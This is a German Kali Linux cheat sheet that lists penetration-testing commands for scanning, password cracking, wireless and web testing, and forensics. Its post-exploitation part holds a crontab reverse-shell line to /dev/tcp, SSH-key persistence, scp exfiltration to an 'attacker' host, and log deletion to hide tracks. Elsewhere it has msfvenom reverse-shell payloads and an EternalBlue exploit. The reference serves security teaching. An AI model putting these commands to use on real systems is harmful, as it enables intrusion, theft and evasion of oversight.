---
title: 'Kali Linux Spickzettel'
description: 'Lernen Sie Kali Linux mit unserem umfassenden Spickzettel, der wesentliche Befehle, Konzepte und Best Practices abdeckt.'
pdfUrl: '/cheatsheets/pdf/kali-linux-cheatsheet.pdf'
---

<base-title :title="frontmatter.title" :description="frontmatter.description">
Kali Linux Spickzettel
</base-title>

<base-pdf-url :url="frontmatter.pdfUrl" />

<base-disclaimer>
<base-disclaimer-title>
<a target="_blank" href="https://labex.io/de/learn/kali">Lernen Sie Kali Linux Penetration Testing mit Hands-On Labs</a>
</base-disclaimer-title>
<base-disclaimer-content>
Lernen Sie Kali Linux Penetration Testing durch praktische Labs und reale Szenarien. LabEx bietet umfassende Kali Linux Kurse, die wesentliche Befehle, Netzwerkerkennung, Schwachstellenanalyse, Passwortangriffe, Webanwendungstests und digitale Forensik abdecken. Meistern Sie ethische Hacking-Techniken und Sicherheitsauditing-Tools.
</base-disclaimer-content>
</base-disclaimer>

## System-Setup & Konfiguration

### Ersteinrichtung: `sudo apt update`

Aktualisieren Sie Systempakete und Repositories für optimale Leistung.

```bash
# Paket-Repository aktualisieren
sudo apt update
# Installierte Pakete upgraden
sudo apt upgrade
# Vollständiges System-Upgrade
sudo apt full-upgrade
# Essentielle Tools installieren
sudo apt install curl wget git
```

### Benutzerverwaltung: `sudo useradd`

Erstellen und verwalten Sie Benutzerkonten für Sicherheitstests.

```bash
# Neuen Benutzer hinzufügen
sudo useradd -m benutzername
# Passwort festlegen
sudo passwd benutzername
# Benutzer zur sudo-Gruppe hinzufügen
sudo usermod -aG sudo benutzername
# Benutzer wechseln
su - benutzername
```

### Dienstverwaltung: `systemctl`

Steuern Sie Systemdienste und Daemons für Test-Szenarien.

```bash
# Dienst starten
sudo systemctl start apache2
# Dienst stoppen
sudo systemctl stop apache2
# Dienst beim Booten aktivieren
sudo systemctl enable ssh
# Dienststatus prüfen
sudo systemctl status postgresql
```

### Netzwerkkonfiguration: `ifconfig`

Konfigurieren Sie Netzwerkschnittstellen für Penetrationstests.

```bash
# Netzwerkschnittstellen anzeigen
ifconfig
# IP-Adresse konfigurieren
sudo ifconfig eth0 192.168.1.100
# Schnittstelle hoch/runter setzen
sudo ifconfig eth0 up
# Drahtlose Schnittstelle konfigurieren
sudo ifconfig wlan0 up
```

### Umgebungsvariablen: `export`

Richten Sie Umgebungsvariablen und Pfade für Tests ein.

```bash
# Ziel-IP festlegen
export TARGET=192.168.1.1
# Wordlist-Pfad festlegen
export WORDLIST=/usr/share/wordlists/rockyou.txt
# Umgebungsvariablen anzeigen
env | grep TARGET
```

### Tool-Installation: `apt install`

Installieren Sie zusätzliche Sicherheitstools und Abhängigkeiten.

```bash
# Zusätzliche Tools installieren
sudo apt install nmap wireshark burpsuite
# Von GitHub installieren
git clone https://github.com/tool/repo.git
# Python-Tools installieren
pip3 install --user tool-name
```

## Netzwerkerkennung & Scanning

### Host-Erkennung: `nmap -sn`

Identifizieren Sie aktive Hosts im Netzwerk mittels Ping-Sweeps.

```bash
# Ping-Sweep
nmap -sn 192.168.1.0/24
# ARP-Scan (lokales Netzwerk)
nmap -PR 192.168.1.0/24
# ICMP-Echo-Scan
nmap -PE 192.168.1.0/24
# Schnelle Host-Erkennung
masscan --ping 192.168.1.0/24
```

### Port-Scanning: `nmap`

Scannen Sie nach offenen Ports und laufenden Diensten auf Zielsystemen.

```bash
# Basis TCP-Scan
nmap 192.168.1.1
# Aggressiver Scan
nmap -A 192.168.1.1
# UDP-Scan
nmap -sU 192.168.1.1
# Stealth SYN-Scan
nmap -sS 192.168.1.1
```

### Dienst-Enumeration: `nmap -sV`

Ermitteln Sie Dienstversionen und potenzielle Schwachstellen.

```bash
# Versionserkennung
nmap -sV 192.168.1.1
# OS-Erkennung
nmap -O 192.168.1.1
# Skript-Scanning
nmap -sC 192.168.1.1
# Umfassender Scan
nmap -sS -sV -O -A 192.168.1.1
```

## Informationsbeschaffung & Aufklärung

### DNS-Enumeration: `dig`

Sammeln Sie DNS-Informationen und führen Sie Zonentransfers durch.

```bash
# Basis DNS-Abfrage
dig example.com
# Reverse DNS-Abfrage
dig -x 192.168.1.1
# Zonentransfer-Versuch
dig @ns1.example.com example.com axfr
# DNS-Enumeration
dnsrecon -d example.com
```

### Web-Aufklärung: `dirb`

Entdecken Sie versteckte Verzeichnisse und Dateien auf Webservern.

```bash
# Verzeichnis-Brute-Force
dirb http://192.168.1.1
# Benutzerdefinierte Wordlist
dirb http://192.168.1.1 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# Gobuster Alternative
gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

### WHOIS-Informationen: `whois`

Sammeln Sie Informationen zur Domain-Registrierung und zum Eigentümer.

```bash
# WHOIS-Abfrage
whois example.com
# IP WHOIS
whois 8.8.8.8
# Umfassende Informationsbeschaffung
theharvester -d example.com -l 100 -b google
```

### SSL/TLS-Analyse: `sslscan`

Analysieren Sie SSL/TLS-Konfigurationen und Schwachstellen.

```bash
# SSL-Scan
sslscan 192.168.1.1:443
# Testssl umfassende Analyse
testssl.sh https://example.com
# SSL-Zertifikatsinformationen
openssl s_client -connect example.com:443
```

### SMB-Enumeration: `enum4linux`

Enumerieren Sie SMB-Freigaben und NetBIOS-Informationen.

```bash
# SMB-Enumeration
enum4linux 192.168.1.1
# SMB-Freigaben auflisten
smbclient -L //192.168.1.1
# Mit Freigabe verbinden
smbclient //192.168.1.1/share
# SMB-Schwachstellenscan
nmap --script smb-vuln* 192.168.1.1
```

### SNMP-Enumeration: `snmpwalk`

Sammeln Sie Systeminformationen über das SNMP-Protokoll.

```bash
# SNMP-Walk
snmpwalk -c public -v1 192.168.1.1
# SNMP-Prüfung
onesixtyone -c community.txt 192.168.1.1
# SNMP-Enumeration
snmp-check 192.168.1.1
```

## Schwachstellenanalyse & Ausnutzung

### Schwachstellen-Scanning: `nessus`

Identifizieren Sie Sicherheitslücken mithilfe automatisierter Scanner.

```bash
# Nessus-Dienst starten
sudo systemctl start nessusd
# OpenVAS-Scan
openvas-start
# Nikto Web-Schwachstellenscanner
nikto -h http://192.168.1.1
# SQLmap für SQL-Injection
sqlmap -u "http://example.com/page.php?id=1"
```

### Metasploit Framework: `msfconsole`

Starten Sie Exploits und verwalten Sie Penetrationstest-Kampagnen.

```bash
# Metasploit starten
msfconsole
# Exploits suchen
search ms17-010
# Exploit verwenden
use exploit/windows/smb/ms17_010_eternalblue
# Ziel festlegen
set RHOSTS 192.168.1.1
```

### Buffer Overflow Tests: `pattern_create`

Generieren Sie Muster für Buffer-Overflow-Exploitation.

```bash
# Muster erstellen
pattern_create.rb -l 400
# Offset finden
pattern_offset.rb -l 400 -q EIP_value
```

### Entwicklung benutzerdefinierter Exploits: `msfvenom`

Erstellen Sie benutzerdefinierte Payloads für spezifische Ziele.

```bash
# Shellcode generieren
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c
# Windows Reverse Shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe
# Linux Reverse Shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf
```

## Passwortangriffe & Anmeldeinformationstests

### Brute-Force-Angriffe: `hydra`

Führen Sie Login-Brute-Force-Angriffe gegen verschiedene Dienste durch.

```bash
# SSH Brute-Force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
# HTTP-Formular-Brute-Force
hydra -l admin -P passwords.txt 192.168.1.1 http-form-post "/login:username=^USER^&password=^PASS^:Invalid"
# FTP Brute-Force
hydra -L users.txt -P passwords.txt ftp://192.168.1.1
```

### Hash-Knacken: `hashcat`

Knacken Sie Passwort-Hashes mithilfe von GPU-Beschleunigung.

```bash
# MD5 Hash-Knacken
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# NTLM Hash-Knacken
hashcat -m 1000 -a 0 ntlm.hash wordlist.txt
# Wordlist-Variationen generieren
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule wordlist.txt
```

### John the Ripper: `john`

Traditionelles Passwort-Knacken mit verschiedenen Angriffsmodi.

```bash
# Passwortdatei knacken
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
# Geknackte Passwörter anzeigen
john --show shadow.txt
# Inkrementeller Modus
john --incremental shadow.txt
# Benutzerdefinierte Regeln
john --rules --wordlist=passwords.txt shadow.txt
```

### Wordlist-Generierung: `crunch`

Erstellen Sie benutzerdefinierte Wordlists für gezielte Angriffe.

```bash
# 4-8 Zeichen Wordlist generieren
crunch 4 8 -o wordlist.txt
# Benutzerdefiniertes Zeichensatzmuster
crunch 6 6 -t admin@ -o passwords.txt
# Musterbasierte Generierung
crunch 8 8 -t @@@@%%%% -o mixed.txt
```

## Tests zur Sicherheit Drahtloser Netzwerke

### Monitor-Modus-Setup: `airmon-ng`

Konfigurieren Sie den WLAN-Adapter für Paketaufnahme und -injektion.

```bash
# Monitor-Modus aktivieren
sudo airmon-ng start wlan0
# Störende Prozesse prüfen
sudo airmon-ng check kill
# Monitor-Modus beenden
sudo airmon-ng stop wlan0mon
```

### Netzwerkerkennung: `airodump-ng`

Entdecken und überwachen Sie drahtlose Netzwerke und Clients.

```bash
# Alle Netzwerke scannen
sudo airodump-ng wlan0mon
# Spezifisches Netzwerk anvisieren
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# Nur WEP-Netzwerke anzeigen
sudo airodump-ng --encrypt WEP wlan0mon
```

### WPA/WPA2-Angriffe: `aircrack-ng`

Führen Sie Angriffe gegen WPA/WPA2-verschlüsselte Netzwerke durch.

```bash
# Deauth-Angriff
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
# Handshake knacken
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
# WPS-Angriff mit Reaver
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
```

### Evil Twin Angriff: `hostapd`

Erstellen Sie betrügerische Zugangspunkte zur Ernte von Anmeldeinformationen.

```bash
# Rogue AP starten
sudo hostapd hostapd.conf
# DHCP-Dienst
sudo dnsmasq -C dnsmasq.conf
# Anmeldeinformationen erfassen
ettercap -T -M arp:remote /192.168.1.0/24//
```

## Tests zur Sicherheit von Webanwendungen

### SQL-Injection-Tests: `sqlmap`

Automatisierte Erkennung und Ausnutzung von SQL-Injection-Schwachstellen.

```bash
# Basis SQL-Injection-Test
sqlmap -u "http://example.com/page.php?id=1"
# POST-Parameter testen
sqlmap -u "http://example.com/login.php" --data="username=admin&password=test"
# Datenbank extrahieren
sqlmap -u "http://example.com/page.php?id=1" --dbs
# Spezifische Tabelle dumpen
sqlmap -u "http://example.com/page.php?id=1" -D database -T users --dump
```

### Cross-Site Scripting: `xsser`

Testen Sie auf XSS-Schwachstellen in Webanwendungen.

```bash
# XSS-Test
xsser --url "http://example.com/search.php?q=XSS"
# Automatisierte XSS-Erkennung
xsser -u "http://example.com" --crawl=10
# Benutzerdefiniertes Payload
xsser --url "http://example.com" --payload="<script>alert(1)</script>"
```

### Burp Suite Integration: `burpsuite`

Umfassende Testplattform für die Sicherheit von Webanwendungen.

```bash
# Burp Suite starten
burpsuite
# Proxy konfigurieren (127.0.0.1:8080)
# Browser-Proxy einstellen, um den Verkehr zu erfassen
# Intruder für automatisierte Angriffe verwenden
# Spider für die Inhaltserkennung
```

### Verzeichnis-Traversal: `wfuzz`

Testen Sie auf Schwachstellen bei Verzeichnis-Traversal und File Inclusion.

```bash
# Verzeichnis-Fuzzing
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://192.168.1.1/FUZZ
# Parameter-Fuzzing
wfuzz -c -z file,payloads.txt "http://example.com/page.php?file=FUZZ"
```

## Post-Exploitation & Rechteausweitung

### System-Enumeration: `linpeas`

Automatisierte Enumeration zur Rechteausweitung unter Linux.

```bash
# LinPEAS herunterladen
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
# Ausführbar machen
chmod +x linpeas.sh
# Enumeration ausführen
./linpeas.sh
# Windows Alternative: winPEAS.exe
```

### Persistenzmechanismen: `crontab`

Etablieren Sie Persistenz auf kompromittierten Systemen.

```bash
# Crontab bearbeiten
crontab -e
# Reverse Shell hinzufügen
@reboot /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
# SSH-Schlüssel-Persistenz
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
```

### Datendiebstahl (Exfiltration): `scp`

Übertragen Sie Daten sicher von kompromittierten Systemen.

```bash
# Datei auf Angreifer-Maschine kopieren
scp file.txt user@192.168.1.100:/tmp/
# Komprimieren und übertragen
tar -czf data.tar.gz /home/user/documents
scp data.tar.gz attacker@192.168.1.100:/tmp/
# HTTP-Exfiltration
python3 -m http.server 8000
```

### Spuren verwischen: `history`

Entfernen Sie Beweise von Aktivitäten auf kompromittierten Systemen.

```bash
# Bash-Verlauf löschen
history -c
unset HISTFILE
# Spezifische Einträge löschen
history -d line_number
# Systemprotokolle löschen
sudo rm /var/log/auth.log*
```

## Digitale Forensik & Analyse

### Festplatten-Imaging: `dd`

Erstellen Sie forensische Abbilder von Speichergeräten.

```bash
# Festplattenabbild erstellen
sudo dd if=/dev/sdb of=/tmp/evidence.img bs=4096 conv=noerror,sync
# Image-Integrität überprüfen
md5sum /dev/sdb > original.md5
md5sum /tmp/evidence.img > image.md5
# Image einbinden
sudo mkdir /mnt/evidence
sudo mount -o ro,loop /tmp/evidence.img /mnt/evidence
```

### Dateiwiederherstellung: `foremost`

Stellen Sie gelöschte Dateien aus Festplatten-Images oder Laufwerken wieder her.

```bash
# Dateien aus Image wiederherstellen
foremost -i evidence.img -o recovered/
# Spezifische Dateitypen
foremost -t jpg,png,pdf -i evidence.img -o photos/
# PhotoRec Alternative
photorec evidence.img
```

### Speicheranalyse: `volatility`

Analysieren Sie RAM-Dumps auf forensische Beweise.

```bash
# OS-Profil identifizieren
volatility -f memory.dump imageinfo
# Prozesse auflisten
volatility -f memory.dump --profile=Win7SP1x64 pslist
# Prozess extrahieren
volatility -f memory.dump --profile=Win7SP1x64 procdump -p 1234 -D output/
```

### Netzwerkanalysator: `wireshark`

Analysieren Sie Netzwerkverkehrsaufzeichnungen auf forensische Beweise.

```bash
# Wireshark starten
wireshark
# Kommandozeilenanalyse
tshark -r capture.pcap -Y "http.request.method==GET"
# Dateien extrahieren
foremost -i capture.pcap -o extracted/
```

## Berichterstellung & Dokumentation

### Screenshot-Erfassung: `gnome-screenshot`

Dokumentieren Sie Ergebnisse durch systematische Erfassung von Screenshots.

```bash
# Vollbildaufnahme
gnome-screenshot -f screenshot.png
# Fensteraufnahme
gnome-screenshot -w -f window.png
# Verzögerte Aufnahme
gnome-screenshot -d 5 -f delayed.png
# Bereichsauswahl
gnome-screenshot -a -f area.png
```

### Protokollverwaltung: `script`

Zeichnen Sie Terminal-Sitzungen zu Dokumentationszwecken auf.

```bash
# Sitzungsaufzeichnung starten
script session.log
# Mit Zeitstempel aufzeichnen
script -T session.time session.log
# Sitzung wiedergeben
scriptreplay session.time session.log
```

### Berichtsvorlagen: `reportlab`

Erstellen Sie professionelle Penetrationstest-Berichte.

```bash
# Berichtstools installieren
pip3 install reportlab
# PDF-Bericht generieren
python3 generate_report.py
# Markdown zu PDF
pandoc report.md -o report.pdf
```

### Beweisintegrität: `sha256sum`

Wahren Sie die Beweiskette durch kryptografische Hashes.

```bash
# Prüfsummen generieren
sha256sum evidence.img > evidence.sha256
# Integrität überprüfen
sha256sum -c evidence.sha256
# Mehrere Datei-Prüfsummen
find /evidence -type f -exec sha256sum {} \; > all_files.sha256
```

## Systemwartung & Optimierung

### Paketverwaltung: `apt`

Warten und aktualisieren Sie Systempakete und Sicherheitstools.

```bash
# Paketlisten aktualisieren
sudo apt update
# Alle Pakete upgraden
sudo apt upgrade
# Spezifisches Tool installieren
sudo apt install tool-name
# Nicht verwendete Pakete entfernen
sudo apt autoremove
```

### Kernel-Updates: `uname`

Überwachen und aktualisieren Sie den Systemkernel auf Sicherheitspatches.

```bash
# Aktuellen Kernel prüfen
uname -r
# Verfügbare Kernel auflisten
apt list --upgradable | grep linux-image
# Neuen Kernel installieren
sudo apt install linux-image-generic
# Alte Kernel entfernen
sudo apt autoremove --purge
```

### Tool-Verifizierung: `which`

Überprüfen Sie Tool-Installationen und lokalisieren Sie ausführbare Dateien.

```bash
# Tool lokalisieren
which nmap
# Prüfen, ob Tool existiert
command -v metasploit
# Alle Tools im Verzeichnis auflisten
ls /usr/bin/ | grep -i security
```

### Ressourcenüberwachung: `htop`

Überwachen Sie Systemressourcen während intensiver Sicherheitstests.

```bash
# Interaktiver Prozess-Viewer
htop
# Speichernutzung
free -h
# Festplattennutzung
df -h
# Netzwerkverbindungen
netstat -tulnp
```

## Wesentliche Kali Linux Verknüpfungen & Aliase

### Aliase erstellen: `.bashrc`

Richten Sie zeitsparende Befehlskürzel für häufige Aufgaben ein.

```bash
# bashrc bearbeiten
nano ~/.bashrc
# Nützliche Aliase hinzufügen
alias ll='ls -la'
alias nse='nmap --script-help'
alias target='export TARGET='
alias msf='msfconsole -q'
# bashrc neu laden
source ~/.bashrc
```

### Benutzerdefinierte Funktionen: `function`

Erstellen Sie erweiterte Befehlskombinationen für gängige Workflows.

```bash
# Schneller nmap-Scan-Funktion
function qscan() {
    nmap -sS -sV -O $1
}
# Verzeichnisstruktur für Engagements
function pentest-setup() {
    mkdir -p {recon,scans,exploits,loot}
}
```

### Tastenkombinationen: Terminal

Meistern Sie wesentliche Tastenkombinationen für schnellere Navigation.

```bash
# Terminal-Verknüpfungen
# Ctrl+C - Aktuellen Befehl beenden
# Ctrl+Z - Aktuellen Befehl suspendieren
# Ctrl+L - Bildschirm löschen
# Ctrl+R - Befehlshistorie durchsuchen
# Tab - Befehle automatisch vervollständigen
# Pfeil Hoch/Runter - Befehlshistorie durchlaufen
```

### Umgebungskonfiguration: `tmux`

Richten Sie persistente Terminal-Sitzungen für lang laufende Aufgaben ein.

```bash
# Neue Sitzung starten
tmux new-session -s pentest
# Sitzung trennen
# Ctrl+B, D
# Sitzungen auflisten
tmux list-sessions
# Mit Sitzung verbinden
tmux attach -t pentest
```

## Relevante Links

- <router-link to="/linux">Linux Spickzettel</router-link>
- <router-link to="/shell">Shell Spickzettel</router-link>
- <router-link to="/cybersecurity">Cybersecurity Spickzettel</router-link>
- <router-link to="/nmap">Nmap Spickzettel</router-link>
- <router-link to="/wireshark">Wireshark Spickzettel</router-link>
- <router-link to="/hydra">Hydra Spickzettel</router-link>
- <router-link to="/devops">DevOps Spickzettel</router-link>
- <router-link to="/docker">Docker Spickzettel</router-link>
